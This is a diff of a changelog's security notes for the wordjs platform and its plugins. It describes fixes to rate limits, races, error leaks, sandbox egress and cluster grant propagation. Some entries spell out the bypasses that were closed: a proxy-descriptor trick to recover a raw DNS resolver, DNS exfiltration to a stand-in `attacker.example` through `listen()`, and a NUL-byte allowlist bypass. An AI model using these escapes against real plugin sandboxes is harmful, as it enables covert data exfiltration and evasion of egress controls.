+    create and email edit had the same gap and now answer 409). Stores from before the upgrade hold no
+    claim, so duplicates already stored do not block the index; the duplicate check still sees them. Two
+    simultaneous applications with the same store name no longer answer 500 with the UNIQUE constraint's
+    text — the second gets a fresh slug. The application reply is the same whether or not the address
+    already has a store (it differed, which told a probe), and public and vendor-portal errors no longer
+    echo the driver's message. Approving a store read its access code and wrote it back, so a code
+    rotation landing in between was undone and the code it retired opened the portal again; the approval
+    now keeps the stored code in the same UPDATE (a fresh one only when the store has none) and mails that.
+  - **job-board 1.0.1** — the application limit (10/min) was one site-wide window, checked before the
+    handler's first await and counted only after the INSERT: 40 simultaneous applications from one client
+    all passed it, were all stored and each mailed the job's `apply_email`, and the full window then
+    answered 429 to every other applicant. The limit is now per client (10/min), claimed in the same
+    synchronous step as the check and refunded when nothing is stored. One application per job and
+    email is now also a unique index: the `WHERE NOT EXISTS` guard alone reads a READ COMMITTED snapshot
+    on Postgres, so simultaneous duplicates could all be stored.
+  - **polls 1.0.1** — the one-vote-per-client mark and the per-poll window (30/min) were recorded only
+    after the vote's INSERT, so 40 simultaneous votes from one client all landed and then closed the poll
+    to everyone for a minute. Both are now claimed in the same synchronous step as their checks and
+    refunded if the vote is not stored.
+  - **digital-downloads 1.1.0**, **restaurant-menu 2.0.1**, **donations 1.0.1**, **contact-forms 1.0.1**,
+    **testimonials 1.0.1**, **popup-builder 1.0.1**, **cookie-consent 1.0.1** — each public limiter was one
+    window for the whole site (contact-forms: per form), so one client could close ordering, downloads,
+    reservations, donations, a contact form, testimonial submissions, or popup and consent statistics for
+    every other visitor. They are now per client: digital-downloads orders 10/min, downloads 60/min and
+    status 120/min; restaurant-menu reservations 5/min and 20/h, orders 30/min (the old site-wide size,
+    because table guests on the restaurant's Wi-Fi share one client key) and the token lookups at their
+    old sizes; donations 10/min and Stripe returns 20/min; contact-forms 5/min per form; testimonials
+    5/min; popup-builder events 30/min; cookie-consent logs 10/min. digital-downloads also sends at most 5
+    mails an hour to one customer address, whatever clients order (past that the order is created and its
+    token shown on screen, without a mail).
+    In donations, two admins marking one donation paid at the same time each mailed the donor a receipt;
+    the admin's flip into `paid` is now conditional and its result gates the receipt, like the Stripe
+    return leg's.
+  - **newsletter 1.0.1** — when the confirmation mail could not be sent the subscriber was confirmed
+    without opt-in. It now stays `pending` and the admin dashboard shows the mail failure. The subscribe
+    limiter was one site-wide window (20/min), so one script closed the form for every visitor; it is now
+    per client (10/min), and each address receives at most 3 confirmation mails an hour whatever clients
+    ask — past that the reply is unchanged and the token is not rotated, so the mailed link keeps working.
+    Simultaneous subscribes for a new address answered 500 to all but one (the email is UNIQUE); they now
+    get the uniform reply. A subscribe that read the subscriber before its confirmation link was followed
+    reset it to `pending` with a new token; the re-subscribe no longer touches a confirmed subscriber.
+  - **Public error replies** (auctions 1.0.1, digital-downloads 1.1.0, invoices 1.0.1, polls 1.0.1,
+    conference-manager 2.15.1, online-store 2.0.1, restaurant-menu 2.0.1) — public routes answered 500
+    `{ error: e.message }`, and the driver's message names the plugin's tables and constraints
+    (`no such table: wjp_conference_manager_conferences`); conference-manager's shared error helper did it
+    for its public form and its location portal. online-store and restaurant-menu put Stripe's error
+    message in the checkout warning and the payment-return reply, and Stripe's message can name the
+    account's key (`Invalid API Key provided: sk_live_****1234`). The details now go to the server log;
+    conference-manager still answers its deliberate refusals (validation, 403, 409) with their own
+    message. Public routes with no catch of their own — in analytics-tag, card-gallery, contact-forms,
+    donations, events-calendar, faq, image-lightbox, notification-bar, online-store, photo-carousel,
+    popup-builder, testimonials, video-gallery and youtube-videos, and conference-manager's portal
+    summary — now catch a failing read and answer 500 with a generic message, the details going to the
+    server log.
+  - **event-tickets 1.0.1** — free tickets were limited only per email, so rotating addresses claimed all
+    capacity. Free seats are now capped per order (4); per email per event (4), a durable quota claimed
+    with one conditional UPDATE on a per-address counter row, so concurrent requests cannot exceed it
+    (free orders placed before the upgrade count, and a cancelled order gives its seats back); and per
+    client per event (4 every 10 minutes). The per-client limit is a rolling window, not a durable count,
+    because a client key is shared behind a NAT or a proxy missing from `trustProxy`: a durable cap let
+    the first 4 free seats lock everyone behind it out of the event. Orders are rate-limited per email,
+    per client and site-wide, and every window is claimed in the same step as the check and refunded when
+    no order is created — checking first and counting after the INSERT let 25 simultaneous orders from
+    one client all land (all 100 free seats) and let one client fill the site-wide order window. An
+    unpaid order's seats went back more than once: the expiry sweep released them before its conditional
+    `pending → expired` flip, so two overlapping sweeps released one order twice and an order the admin
+    confirmed under the sweep lost its seats; the admin's cancel accepted any status but `cancelled`, so
+    cancelling an expired order (the order list offers it) released its seats again. The type could then
+    sell more tickets than its capacity. Seats are now released only by the flip that wins, from a status
+    that holds them; confirming the payment of an order that expired meanwhile answers 409 instead of
+    "already paid" with no tickets; and a capacity cut is written only while it still covers the seats sold.
+  - **conference-manager 2.15.1** — editing an inscription read the attendee, decided whether to free its
+    bed and wrote outside the assignment lock that placements, the auto-assignment and the lodging
+    submit/review run under, and the admin's manual placement read the attendee before taking that lock:
+    a cancellation and a placement landing in each other's gap left a cancelled attendee holding a bed.
+    Both now read and write under the lock. A bus capacity cut is checked under the lock ticket sales
+    use, so a sale can no longer land between the check and the write and leave more tickets than seats.
+    Transport payments check what a ticket still owes under that lock too. Repricing a bus's sold tickets
+    checked under it that nothing was paid beyond the new price, but wrote the tickets' new price after
+    releasing it: a payment landing in between was accepted against the old price and the ticket ended
+    up paid beyond the new one. Deleting a bus, removing a passenger and deleting an attendee checked for
+    (or erased) transport payments outside it, so a payment landing in the gap was answered as recorded
+    and then erased with its ticket. All of them now check and write under the lock.
+  - **mail-server 2.2.5** — the vacation auto-responder replied to any claimed sender, which made a
+    vacationing mailbox a reflector for forged mail. Inbound mail now gets a reply only when SPF passed for
+    the envelope domain and that domain is the header From domain, replies are capped at 50 distinct
+    recipients per mailbox per 24 h, and a second transaction in the same SMTP session no longer inherits
+    the previous transaction's SPF verdict.
+- **A network-granted plugin can no longer recover a raw DNS resolver from the guarded `dns` module.**
+  The `dns` module a plugin receives is a guarded stand-in: it permits `dns.lookup`/`dns.lookupService`
+  (system-resolver lookups whose name is checked against the plugin's egress policy before it is
+  resolved; the private-address filter applies when a connection is made) and refuses the raw c-ares
+  resolver surface (`resolve*`, `Resolver`, `setServers`), which does DNS over its own sockets, below the
+  egress filter. The stand-in was a Proxy with only a `get` trap, so
+  `Object.getOwnPropertyDescriptor(require('dns'), 'resolveTxt'`
+  `|'Resolver'|'promises')` handed back the real member and `new Resolver()` built a raw resolver — a
+  plugin resolved any name (exfiltration) under an allowlist or deny-all, and probed internal hosts. It is
+  now a frozen object holding only the permitted members and a clear-error stub for every resolver
+  function, named or not, so a resolver a newer Node adds (`dns.resolveTlsa`, in Node 22.15 and 23.9)
+  is refused by default rather than forwarded. `require('dns')`, `require('dns/promises')` and their `node:` spellings
+  are covered identically (`dns/promises` gets the promise-returning stand-in), and `import()` of any of
+  them stays refused. The egress guard also reads `net.isIP` captured at load: `import('net')` gives a
+  network-granted plugin the real `net` module, whose `isIP` is writable, and with it overwritten a
+  loopback address was no longer recognised as an address and a connection to it went through.
+- **A host name given to a server's `listen()` or a UDP socket's `bind()` now obeys the plugin's egress
+  policy, like a connection's host.** Those calls resolve their host through Node's own `dns.lookup`,
+  not through a connect path, so a network-granted plugin could make the system resolver query any name
+  (`listen(0, '<data>.attacker.example')` sends that name to the attacker's nameserver) under an
+  allowlist or deny-all. Inside the plugin's process that lookup is now gated: an IP literal or no host
+  behaves exactly as before, and a name is checked against the egress policy before it is resolved — a
+  name off the allowlist, or any name under deny-all, is refused with the sandbox's egress error on the
+  server's or socket's `error` event. A plugin with no allowlist configured is unaffected. Regression test:
+  `backend/src/tests/egress-listen-bind-host.test.ts` (a real isolated plugin under each policy state).
+- **Plugin grant and egress-allowlist changes now reach every backend node.** On a multi-node cluster,
+  revoking a plugin's grants or narrowing its egress allowlist took effect only on the node that served the
+  admin request; every other node kept the old grants and the old (allow-all) allowlist — including the
+  `wordjs.dns` name check, the exact exfiltration path the allowlist exists to close — until it restarted.
+  The change is now published over the Redis coherence bus, and each node re-reads both policies from the
+  database and respawns any running plugin child whose spawn-time grants or allowlist no longer match.
+  Pub/sub drops messages silently (a Redis restart, a subscriber reconnect, the moments before a booting
+  node subscribes), so each node also re-reads both policies as soon as it has subscribed, whenever its
+  bus reconnects and every 10 seconds: a lost broadcast now delays a revoke by about that plus the time
+  the plugin's child takes to restart, instead of until a restart. Each re-read restarts every affected
+  child at once (at most four at a time) without waiting for them, so one child slow to start does not
+  hold back the others or the next re-read. A grant change also no longer races a re-read on the node
+  that made it: the change is written to the database before memory, and re-reads and writes run one at
+  a time, so a re-read landing mid-write cannot put the old grants back in memory — from where the
+  permission route was about to respawn the plugin's child, still holding a revoked network grant.
+  Memory is updated as soon as the row is written, before plugins that listen for option changes are
+  notified: that notification reaches each of them in turn, and until it finished a revoked grant stayed
+  in force on the node that wrote the revoke, with the cluster-wide policy lock held. The permission and
+  egress-allowlist routes now also restart the plugin's child at that point — or deactivate the plugin,
+  when its code needs a capability just revoked — and only then wait for the notification: the child
+  holds what it was started with, so until every listener had been told it kept a revoked network or
+  filesystem grant, or the old allowlist. The write itself reads the stored policy from the database
+  under that lock rather than through the option cache, so it cannot write back a stale copy over another
+  node's change to a different plugin. A grant token that is neither `network` nor `scope:access` is no
+  longer stored: every re-read dropped it again, which restarted the plugin's child once and logged a
+  warning on every node every 10 seconds; a malformed entry already in the store is now reported once.
+  When an admin activates a plugin, the grants it is given are now stored before the other nodes are
+  told about the activation (they used to load it first, without its grants, or refuse it as "declared
+  but not granted"), and a node loading a plugin that another node activated re-reads the policy before
+  checking it. Activation grants a plugin its declared permissions when its record is missing, or empty
+  with no administrator decision recorded for it: since 1.12.12 every in-place update of a plugin with no
+  grant record has stored an empty one (it still does, see the update entry above), so on an existing
+  site an empty record alone does not mean an administrator revoked everything. Grants set through the
+  permissions screen (and the ones the activation dialog approves) are now recorded as the
+  administrator's decision, so a partial revoke and a revoke of every permission both survive a
+  re-activation.
+- **A plugin deactivated on one node no longer keeps running on a node that missed the broadcast.**
+  Every node now stops a plugin it still runs once the shared list of active plugins has not included it
+  on two consecutive re-syncs (10 seconds apart), never while an activation of it is in progress on that
+  node. The read-modify-write of that list also reads it from the database inside its lock: through the
+  option cache, a node that missed a peer's change wrote the old list back (re-activating a plugin the
+  peer had just deactivated), and a database read error came back as an empty list, which the activation
+  then saved — deactivating every other plugin on the site.
+- **The `wordjs.dns` bridge obeys the plugin's egress allowlist.** `resolveMx`, `resolveTxt`, `resolve4`,
+  `resolve6` and `resolve` now check the name being resolved against the plugin's egress allowlist
+  before querying, in addition to the `network` grant. Before, only the A/AAAA answers were filtered, so
+  a plugin limited to one vendor could still look up any name. That is outbound traffic in itself: a
+  query for `<data>.attacker.example` reaches the attacker's nameserver. An empty allowlist still allows
+  every public name. While the egress policy has not loaded, every lookup is refused, the same fail-closed
+  rule the plugin's sockets follow. A name containing a control character is refused in every state: the
+  resolver stops at the first NUL, so `<data>.attacker.example\u0000.vendor.example` passed an allowlist
+  of `vendor.example` and was queried as `<data>.attacker.example`.
+- **The plugin egress allowlist judges the host that is actually resolved.** Inside a network-granted
+  plugin's process, `net`, `tls`, `http`, `https`, `dgram` and the `fetch` pre-check compared a host such
+  as `any-public-host\u0000.vendor.example` with the allowlist by its suffix, while the system resolver
+  resolved only the part before the NUL, so a plugin limited to one vendor could reach any public server.
+  While an allowlist is set, a host now matches only if it is a plain ASCII hostname (letters, digits,
+  `-`, `_`, dots) or an IP literal; a NUL or other control character, a backslash, whitespace or a
+  non-ASCII name (which Node maps with IDNA before resolving) is refused. Internationalised names must be
+  passed in punycode form (`fetch` and `URL` already do this). The plugin's own `dns.lookup`,
+  `dns.lookupService` and `dns.promises.lookup` now obey the allowlist too: before, a plugin limited to one
+  vendor could look up `<data>.attacker.example` through them, and the query reached the attacker's
+  nameserver.
+- **A plugin whose egress policy could not be loaded now reaches no public host.** If the host fails to
+  load the egress allowlists at boot (a database error, for example), it starts network-granted plugins
+  in a deny-all state. Every connection check in the plugin's process ran only when an allowlist was
+  installed, and deny-all installs none, so those plugins got unrestricted public egress (TCP, HTTP,
+  `fetch`, WebSocket and UDP) instead of none. Every check now applies the policy in all three states
+  (no allowlist, allowlist, deny-all), and under deny-all `dns.lookup` resolves nothing either. A
+  database error now actually leads to that state: the host read the policy through a function that
+  answers a failed read with an empty default, so the error looked like a successfully loaded, empty
+  policy — every public host allowed. The grant and egress policies are now read strictly; a failure at
+  boot leaves network-granted plugins deny-all until a later re-read succeeds (and their children are
+  then respawned with the real policy), and a failure on a later re-read keeps the policy last read,
+  instead of dropping every plugin's grants.
+- **A frontend replica no longer relays client forwarding headers to its backend.** With
+  `WORDJS_BACKEND_URL` set, the frontend's own proxy copied a client's `X-Forwarded-For` (and
+  `Forwarded`, `X-Real-IP`, `X-Forwarded-Port`, `X-Forwarded-Server`) through unchanged. The backend trusts
+  forwarded headers from a loopback hop, so a client could choose the IP address used for rate limiting,
+  lockouts and the audit log. The proxy now removes every client forwarding header and sets
+  `X-Forwarded-For` to the socket's peer address, `X-Forwarded-Host` to the Host it received and
+  `X-Forwarded-Proto` to its own listener's scheme, as the gateway does at its edge. The replica's own
+  proxy is not the only route to the backend: Next's `/api` rewrite forwards too and relays headers
+  unchanged, and it took dot-segment paths (`/x/../api/v1/auth/login`, `/x/%2e%2e/api/…`, which Next
+  resolves into `/api`) and every WebSocket upgrade, which Next's own upgrade listener rewrote. The
+  replica now restates the forwarding headers on every request and upgrade before either route sees it,
+  and answers a path with a dot segment or a backslash with `400 rest_bad_path`, as the gateway and the
+  monolith do. On the replica's mutual-TLS listener, a request presenting the gateway's own client
+  certificate (`CN=gateway-internal`) keeps the forwarding headers the gateway already stated at its
+  edge, so a replica behind the gateway no longer overwrites the gateway's judged `X-Forwarded-Host` with
+  its own internal host or the client's address with the gateway's. Any other cluster certificate on
+  that listener — a backend node's or another frontend's, which mutual TLS accepts just the same — has
+  its headers restated like a client's, as does every request on the client-facing (HTTP) listener.
+- **The first TOTP use when the replay counter is missing is accepted exactly once.** TOTP anti-replay
+  advances `mfa_totp_last_step` with a compare-and-set. If the row was missing (a partial restore, an
+  imported database, or an enrollment written by other tooling), the compare-and-set matched nothing and
+  every TOTP code was refused, which locked the account out of TOTP (codes were never replayable).
+  Enrollment already creates the row. Now the first use creates it with an insert-if-absent inside a
+  transaction that locks the user's secret row, so exactly one of several concurrent submissions is
+  accepted and a replay of that code is refused. Enrollment now writes the counter before the secret.
 - **Plugin `dependencies` accept only plain npm registry version ranges.** The host installs a plugin's
   manifest `dependencies` with `npm install` in its own root at activation, and npm runs the `prepare`
   script of a `git+…`/`github:` or `file:` directory dependency even with `--ignore-scripts` — so a
@@ -212,10 +843,11 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   (`documentation/security.md` §1.3b).
   **Upgrade:** the first boot after upgrading grants `browser:script` once to every plugin that was
   already active and already shipped browser code, so working sites keep their plugin pages, hooks and
-  blocks; it is logged and recorded in the `plugin_browser_capability_migrated` option, and never runs
-  again. A plugin installed before this release that does not declare the permission keeps running while
-  active and shows a flagged `browser:script` row in Admin → Plugins, but must be updated before it can
-  be activated again. Every catalog plugin and the `wordjs` CLI plugin template now declare it; the
+  blocks; it is logged and recorded as done inside the grant store (see the entry above on replaying
+  this step), and never runs again. A plugin installed before this release that does not declare the
+  permission keeps running while active and shows a flagged `browser:script` row in Admin → Plugins, but
+  must be updated before it can be activated again. Every catalog plugin and the `wordjs` CLI plugin
+  template now declare it; the
   catalog plugins get a patch version bump so installed copies are offered the update.
 - **`GET /api/v1/plugins/registry` no longer publishes plugin manifests.** The unauthenticated registry
   returned every active plugin's name, exact version, author, requested permissions and dependencies — a
@@ -258,6 +890,25 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   first random byte was itself `0x00` (about 1 draw in 512) the certificate carried a non-minimal DER
   INTEGER that OpenSSL 3 refuses (`illegal padding`), so that identity — or, if it was the CA itself,
   every enrollment — failed. Serials are now 16 random bytes with a first byte of `0x01`–`0x7f`.
+- **A plugin admin page is never blank: without `browser:script` it says why and links to the switch.**
+  With a plugin active but its `browser:script` permission not granted, `/admin/plugin/<slug>` rendered an
+  empty page with no explanation: the bundle loader turned the refused bundle (404) into an empty
+  component, so neither its fallback nor the page's "Plugin Not Found" could ever render. The load now
+  fails with its cause. When the public plugin registry says the plugin is active and not granted
+  (resolving an admin-page slug such as `emails` to its plugin through the admin menu), the page shows
+  "This plugin's interface is not served until you grant 'Run code in your browser' (browser:script) in
+  Admin → Plugins → Permissions" with a link to `/admin/plugins?permissions=<plugin>`, which opens that
+  plugin's permissions dialog once — the screen then drops the parameter from the address bar, and its
+  later list reloads (after a save, an activation, a deactivation) or a page reload do not reopen it; any
+  other failure renders the not-found fallback. A refusal is not
+  cached, so the page loads on the next visit once the permission is granted. (The permission gates the
+  bundle the backend serves, which on a release build is every plugin admin page. A frontend you build
+  yourself also compiles in, from source, the admin pages of the plugins its backend reports active at
+  build time (every plugin on disk when the generator cannot reach the backend), so build it only with
+  plugins you trust with the admin session; see `documentation/security.md` §1.3b.) The runtime hooks loader
+  also stops requesting `bundle?type=hooks` from every active plugin on every admin screen: it reads the
+  registry once per pass and asks only the plugins that declare `frontend.hooks` (and any it cannot
+  vouch for), instead of collecting a silent 404 per hook-less plugin.
 - **The F6 performance budget no longer fails the Linux CI on unchanged code.** Its ratio ceilings were
   measured on one Windows host and judged on the Linux runners too, where the reference workload
   (autocommit inserts) is cheaper and the mostly-CPU operations read up to ~2.5x their Windows ratios —
@@ -274,7 +925,6 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   failed the F6 phase suites on unchanged code (`contentUpdate` 10.742x against 10.662x), so it was
   re-minted from 145 rounds including the measurements of failing enforcing jobs (`--from` now also
   accepts the harness's own `measured:` rounds).
-
 - **Marketplace plugins render with all of their styles on a live site.** A plugin installed from the
   marketplace is loaded at runtime from its own bundle, and a release build only compiled the Tailwind
   classes of the plugins git tracks, so every class only a plugin used was missing in production while
@@ -298,9 +948,11 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   block (it used to stack one more per cycle); class names whose arbitrary value holds quotes
   (`content-['']`, `font-['Inter']`, `bg-[url('…')]`) are found; a missing host stylesheet stops the build
   instead of silently dropping the host's theme tokens, and a test pins that the plugins and the host
-  compile with the same Tailwind. `manifest.json`, `client/admin/admin.css` and `dist/component.bundle.css`
-  are served `no-cache` with their ETag (was `max-age=3600`): their URLs carry no version, and for up to
-  an hour after an update a browser ran the new bundle with the old classes. The host stylesheet also scans
+  compile with the same Tailwind. `dist/component.bundle.css` on the `/plugins` mount and
+  `client/admin/admin.css` from `GET /api/v1/plugins/:slug/admin-style/css` (see Security; it reaches
+  every signed-in user who can open the plugin's page, not only administrators) are served `no-cache`
+  with their ETag (was `max-age=3600`): their URLs carry no version, and for up to an hour after an
+  update a browser ran the new bundle with the old classes. The host stylesheet also scans
   the first-party catalog sources (`@source "../../../marketplace/plugins/**/*.{ts,tsx}"`, about +5 KB
   gzipped), which puts the catalog's own variants in the host's order on a newer core and keeps an older
   package styled there. Every catalog package now carries its compiled classes, and installed copies
@@ -323,7 +975,6 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   third-party frames may not, and the microphone, geolocation and the Topics API stay denied. It is one
   value for every route because a document keeps the policy it was loaded with, and the admin is usually
   reached by a client-side navigation from `/login`.
-
 - **conference-manager 2.15.1: the phone scanner shows whatever it reads, and every plugin dialog works on
   a phone.** On an iPhone in production the meal scanner reacted to nothing, a product box included, and
   the «Nueva conferencia» form opened under the admin header.
@@ -363,6 +1014,14 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
     painted).
     `catalogClassAssets.test.ts` keeps every catalog source the host compiles free of `url()` to another
     host.
+- **One query for the parent entries of a media page.** The media list's per-item visibility check
+  resolved each parent with its own `Post.findById` — up to 100 lookups per page. The page's parents are
+  now loaded with a single `IN` query (`Post.findByIds`).
+- **Editing-presence rooms are reclaimed.** `POST /api/v1/presence/:postId` keeps one in-memory room per
+  post, and only an explicit `leave` deleted one. An editor that closed the tab without sending it (a
+  crash, a dropped beacon, lost network) left its room in memory for the life of the process. A periodic
+  sweep now removes rooms whose editors have all expired. It runs only while rooms exist and does not keep
+  the process alive.
 
 ## [2.3.0] - 2026-10-07
 
